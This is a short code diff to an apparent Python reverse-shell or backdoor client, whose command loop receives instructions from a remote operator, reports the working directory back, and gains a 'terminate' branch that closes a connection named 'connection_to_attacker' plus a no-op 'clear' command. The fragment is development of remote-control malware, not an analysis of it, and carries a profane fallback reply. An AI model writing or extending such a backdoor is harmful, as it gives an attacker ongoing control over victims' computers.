@@ -18,8 +18,9 @@ def shell():
     while True:
         command = reliable_recv()
         print("Command Recieved")
-        if command == 'say':
-            print("Hello World")
+        if command == 'terminate':
+           connection_to_attacker.close()
+           break
         elif command == 'pwd':
             try:
                 files = os.getcwd()
@@ -28,6 +29,8 @@ def shell():
                 reliable_send(files)
             except:
                 pass
+        elif command == 'clear':
+            pass
         else:
             print("FuckOff")
                 
